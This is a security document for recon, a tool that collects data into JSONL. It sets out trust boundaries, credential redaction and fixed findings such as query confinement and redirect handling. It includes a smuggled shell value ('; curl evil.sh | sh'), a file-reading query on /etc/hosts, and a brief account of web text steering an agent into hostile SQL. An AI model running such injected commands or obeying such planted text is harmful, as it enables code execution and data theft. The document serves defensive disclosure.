# Security — recon

recon collects from heterogeneous sources — HTTP APIs, local CLIs, web pages, capture logs
— and normalises the results to JSONL. Two things make it worth reading before you run
someone else's config: **a recon config runs shell commands**, and recon handles source
credentials.

Audience: anyone running `recon survey` against a config they did not write.

**Read the plan first.** `recon survey <mission> --dry-run` validates the config and lists
every run it would make — the exact substituted shell commands, the URLs, and each run's
declared effects (network, subprocess, filesystem) — without fetching, executing or writing
anything. Reviewing a config means reviewing that plan.

## Blast radius

A survey may execute arbitrary shell commands, make outbound HTTP requests carrying your
credentials, and write files under the mission directory (`.recon/<mission>/`).

## Trust boundaries

### 1. Config file → shell (`cli` collector)

`PopenRunner.run_lines` executes with `shell=True`. The command string is built by
`substitute(entry.run, {"url": ..., "pattern": ...})` — string interpolation with **no
quoting**. Both `entry.run` and `entry.patterns` come from the config; `url` comes from
the referenced source entry.

**A recon config is executable. Reviewing one is reviewing a shell script.** A `pattern`
containing `; curl evil.sh | sh` runs. This is not a defect to be fixed by quoting: the
whole point of `run:` is to invoke a local tool with operator-chosen arguments, and
quoting it would break the feature. It is a boundary to be *known*. `--dry-run` prints
every substituted command, which is the place to read them.

What constrains it:

- The child starts in a session of its own (`start_new_session` on POSIX), so a timeout
  kills the whole tree rather than only the shell — a runaway pipeline cannot outlive the
  run.
- The source's `timeout` bounds the command (default 60s); a command with no source has
  300s.
- Its stdin is empty: a command cannot read recon's own input.

What does **not** constrain it: nothing restricts which binaries run, what they touch, or
where they connect. The child inherits recon's environment, every variable of it. There is
no allowlist. Declared effects are what a collector type says about itself; recon reports
them and does not enforce them.

### 2. Source entries → outbound credentials (`api` collector)

A source entry names an environment variable holding its secret (`auth.env`), read through
an injected `Mapping` that defaults to `os.environ`. It is sent as a header (`auth.header`),
a query parameter (`auth.param`), or both. Two consequences:

- The secret is attached to requests to **whatever URL that source declares**. A config
  that points a credentialed source at an attacker's host exfiltrates the credential. The
  URL and the credential are chosen by the same file. The dry-run plan shows each URL.
- The secret goes only to the origin of the request a collector built. A redirect to
  another host, port or scheme is followed without the source's `auth.header`, as httpx
  follows one without `Authorization`; an upgrade from http to https on the same host keeps
  it (R-9). A key sent as `auth.param` is part of the URL: a redirect carries it on only
  when the server writes it into the new location.
- Secrets are never written to the JSONL output and never logged. Request headers are
  never persisted. In captures, response headers are persisted with credential-bearing
  values redacted (R-2), and an `auth.param` value is redacted from the captured URL (R-4).

An unset `auth.env` variable sends the request without credentials; the plan warns about
it before anything is sent.

A collector type is not handed the process environment. Its `env` holds only the
variables the mission declares for it: the `auth.env` names of the catalog sources its
collectors run against. A plugin type therefore sees the secrets the config granted its
sources and no others, and reading any other name fails the table with a config error
that says where to declare it, rather than returning nothing (R-5). This scopes what a
collector type is *handed*; it is not a sandbox. A plugin is Python in recon's process and
can import `os`, and a `cli` command's child process inherits recon's whole environment
(boundary 1).

### 3. Remote responses → local files

Collected records are attacker-influenced data by definition. recon writes them as JSONL
values, never as paths or commands. Output filenames come from the collector entry's
`name` in the config, not from response content. Capture bodies are named by their own
sha256, never by anything in the response.

`$markitdown` is the one built-in transform that opens a file, and the path it opens is
a collected value. It reads only under the mission directory and the catalog's `local`
sources (after resolving symlinks and `..`), and it never fetches a URL; either refusal
fails the table with a config error (R-6).

### 4. Capture logs → the capture collector

A capture log (`captures.jsonl`, format `recon.v1.capture`) may be written by tools other
than recon, so the `capture` collector trusts nothing in it that names a file. A line's
`body` must be exactly `raw/<sha256>` relative to the log — no other path, absolute or
relative, is opened — and the bytes must hash to that sha256. A line that fails either
check stops the table with an error naming the file and line.

### 5. Claude Code hook → `recon capture`

`recon capture <mission>` appends whatever `PostToolUse` payload arrives on stdin. The
payload's `tool_response` is stored verbatim and its other fields (`tool_input`,
`session_id`, `cwd`, ...) become the capture's `request`. A captured MCP result can contain
anything the tool saw, including private data, so `.recon/<mission>/captures/` deserves the
same care as the conversation transcript. `recon capture` writes only under an existing
mission's directory; it refuses (exit 4) when the mission does not exist, rather than
creating one from a name it was handed.

### 6. Collected text → SQL (`recon query`)

`recon query` runs the SQL it is given, and the SQL is usually written by an agent that
has just read the tables — text from the open web, an API, a tool's output. A table can
therefore talk its reader into a query, and DuckDB SQL can read files and load extensions
that reach the network.

The connection is confined before any SQL runs: `allowed_directories` is the mission's
`archive/` directory, extension auto-install and auto-load are off, external access is
off (DuckDB does not allow turning it back on), and the configuration is locked. A query
reads its own and earlier archives of the same mission and nothing else; `INSTALL`, `LOAD`
and URLs are refused (R-7). DuckDB lets SQL write wherever it may read, so a query runs only
statements DuckDB's parser types as SELECT; `COPY ... TO`, `ATTACH`, `CREATE`, `EXPORT` and
every other statement are refused before any of the SQL runs (R-10).

What this does **not** do: a large sort or join can still use DuckDB's spill directory
(`.tmp/` under the working directory). And it does nothing about the text itself: a
`content` column from the web is untrusted wherever it is read.

### 7. Telemetry → the archive's event log, and an OTLP endpoint

Every survey writes its spans to `telemetry.jsonl` in its archive and hands them to
OpenTelemetry's API, which exports them when an SDK is installed: by the `recon` command
when the `OTEL_*` variables name an endpoint, or by a program that imports recon. The
attributes are chosen so that neither destination receives a secret or a body: no header,
request body or response body is an attribute, and `url.full` has its user information,
the source's `auth.param` value and the signature parameters of the HTTP conventions
(`X-Amz-Signature`, `X-Amz-Credential`, `X-Amz-Security-Token`, `sig`, `X-Goog-Signature`)
replaced by `REDACTED`. A span that failed carries its error's kind and a message in recon's
own words, never the error's text, which can quote a command, a URL or SQL (R-11). A failed
table's error, its command or URL included, stays in the archive's `meta.yaml`, and a URL
in an error message has its user information and `auth.param` value `REDACTED` there too.

What this does **not** do: a secret a mission puts anywhere else in a URL (in a path, or in
a query parameter that is not its source's `auth.param`) is recorded as written, as it is
in the dry-run plan and `meta.yaml`. A `cli` collector's commands are neither attributes
nor span messages. The
endpoint the variables name receives the mission's URLs, table and collector names, and
record counts: point it at a collector you trust with them.

## Findings

### R-1 — generator cleanup silenced to satisfy the type checker (fixed 2026-08-17)

The writer of a table (then `_sink`, now `ArchiveFiles.write_table`) wraps its record
stream in `contextlib.closing(records)`. During the strict-typing
pass the wrapper was removed because the parameter was typed `Iterable`, which
`closing()` rejects.

That wrapper is load-bearing, not decoration. `_sink` consumes a generator that may hold
an open subprocess pipe or HTTP connection; if the consumer raises partway, `closing()` is
what runs the generator's `finally` and releases it. Without it a failed collect leaks a
file descriptor and can leave a child process running.

Fixed by typing the parameter `Generator[dict[str, Any], None, None]` — the type it
actually is — so `closing()` type-checks and stays.

**Note on the regression test:** the first test written for this passed *with the bug
present* and was worthless. The discriminating case is a **suspended** generator (one with
a live `finally`) plus a **consumer that raises** — only that combination distinguishes
"cleanup happened" from "the generator was exhausted anyway".

### R-2 — raw capture persisted `Set-Cookie` verbatim (fixed 2026-08-18)

With `preserve_raw: true`, the raw capture wrote every response header to disk
unfiltered. A server that issued a session cookie put a **live credential** into a file
whose whole purpose is to be kept, committed, and shared — the audit artefact was the leak.

Fixed: `redact_headers` replaces the values of a named set (`set-cookie`, `authorization`,
`x-api-key`, …), matched case-insensitively. The **key is preserved** so the capture still
proves the server set a cookie; only the value is gone. Dropping the header outright would
have destroyed the evidence the file exists to hold. Since 0.9.0 the redaction applies to
every line of the capture log (`captures.jsonl`).

Regression: `recon/tests/test_capture_log.py`.

### R-3 — CLI capture records the substituted command (open, by design)

A `cli` capture records the fully-substituted commands in its `request`. That is the point
— it is what makes a CLI capture reproducible. But a config that inlines a secret
(`run: curl -H 'Authorization: Bearer sk-...'`) puts that secret on disk.

Not fixed, and not fixable by redaction without guessing at shell syntax and breaking
reproducibility. **Keep credentials in environment variables referenced by a source's
`auth.env`, never inline in a `run:` string.** If you must inline one, treat the archive
as secret material.

### R-4 — `auth.param` would have put the key in the captured URL (prevented, 0.9.0)

`auth.param` sends the credential in the query string, and the response URL — which a
capture records — carries the query string. Implementing `auth.param` without care would
have written the key into every capture. The `api` collector replaces that parameter's
value in the captured URL with the redaction marker before recording it.

Regression: `test_param_key_never_reaches_the_capture_log` in
`recon/tests/test_api_collector.py`.

### R-5 — every collector type was handed the whole environment (fixed)

The composition root passed `os.environ` to every collector type's factory, so installing
a third-party collector type gave it every credential on the machine, whatever the
mission's config named. Fixed by handing each type a mapping scoped to the `auth.env`
names of the sources its collectors use (boundary 2). An undeclared read raises, because
a silent "not set" would send the request without its key.

Regression: `recon/tests/test_composition.py`, and
`test_a_plugin_reading_an_undeclared_variable_fails_its_table_with_a_fix` in
`recon/tests/test_cli.py`.

### R-6 — `$markitdown` fetched URLs and read any path a record named (fixed)

The transform passed the record's value to markitdown's `convert`, which fetches `http:`
and `https:` URLs and opens `file:` URIs and any local path. A record is whatever a
source returned, so a response could make a survey request an arbitrary URL — outside the
requester, the rate limit and the capture log, with no network effect in the plan — or
copy `~/.ssh/config` into a table.

Fixed: URIs are refused, and a path must resolve under the mission directory or a `local`
catalog source. Both are config errors with a fix, not an empty column.

Regression: `recon/tests/test_transforms.py`, and the `test_markitdown_*` tests in
`recon/tests/test_composition.py` (one serves a page from localhost and asserts no
request arrives).

### R-7 — `recon query` could read any file and load extensions (fixed)

`recon query m "SELECT * FROM read_text('/etc/hosts')"` returned the file, and nothing
stopped a query from installing `httpfs` and fetching a URL. Fixed by confining the
connection as boundary 6 describes; the settings and their order were checked against
DuckDB 1.5.5.

Regression: `recon/tests/test_query.py`, and
`test_reading_outside_the_archive_is_refused_with_a_fix` in `recon/tests/test_cli.py`.

### R-8 — telemetry could carry the credential a URL holds (prevented, 0.11.0)

An HTTP span's `url.full` is the URL as sent, and an `auth.param` source sends its key in
the query string. Prevented before release by redacting that parameter, user information
and the conventions' signature parameters, and by recording only the first line of an
error.

Regression: `test_a_request_is_a_client_span_with_the_required_attributes` and
`test_a_transport_failure_names_its_exception_and_credentials_in_the_url_are_redacted` in
`recon/tests/test_telemetry.py`.

### R-9 — a source's own auth header followed a redirect to another host (fixed)

httpx drops `Authorization` when a redirect leaves the origin, and nothing else. A source
whose key goes in its own header (`x-api-key`, as Exa, Serper and Semantic Scholar take
it) sent that key to whatever host its API redirected to. Fixed by dropping the source's
`auth.header` from every request sent outside the origin of the one the collector built,
by the rule httpx applies to `Authorization`. The redirect is still followed rather than
refused: an API that sends a download to a storage or CDN host with a signed URL needs no
key there, and refusing would fail that table for no gain.

Regression: `test_a_redirect_to_another_origin_does_not_carry_the_sources_credential` and
`test_a_redirect_within_the_origin_keeps_the_credential` in
`recon/tests/test_http_requester.py`.

### R-10 — a query could write into the mission's archives (fixed)

The confinement of R-7 lets SQL write wherever it may read, so `COPY (...) TO`, `ATTACH`
and `EXPORT` wrote files under `archive/`: over an archive's `meta.yaml`, or a planted
`.jsonl` that the next query read as a table. Fixed by running only statements DuckDB's
parser types as SELECT; any other is a `query` error that names it, and nothing in the SQL
runs.

Regression: `TestOnlyReads` in `recon/tests/test_query.py`, and
`test_no_query_the_skill_teaches_is_refused_as_a_write` in `recon/tests/test_skill.py`.

### R-11 — a failed span exported a command and a URL's credentials (fixed)

R-8 kept a failed span's message to the first line of its error, and that line could be
the whole problem: a failed `cli` command's error begins with the command, and a failed
request's with its URL, user information included. Both reached the OTLP endpoint as the
span's status, and the event log, so a secret inlined in `run:` (R-3) left the machine
when its command failed. Fixed: a failed span's message describes the failure in recon's
own words (the table failed, and its kind; the status code; the exception class) and
quotes nothing; the error's text stays in `meta.yaml`. A URL in an error message is
reported as `url.full` is, with user information and `auth.param` `REDACTED`.

Regression: `test_a_failure_exports_no_command_and_no_credential_in_a_url` in
`recon/tests/test_telemetry.py`, which runs `recon survey` with an OTLP receiver.

## Not covered

- No sandboxing of collector commands. See boundary 1.
- No egress allowlist. A source may point anywhere.
- No TLS pinning; recon uses the platform trust store.
- Declared collector effects are not enforced.

## Reporting

Open an issue on the gnx repository, https://github.com/mox-labs/gnx/issues. There is no
separate embargo channel.
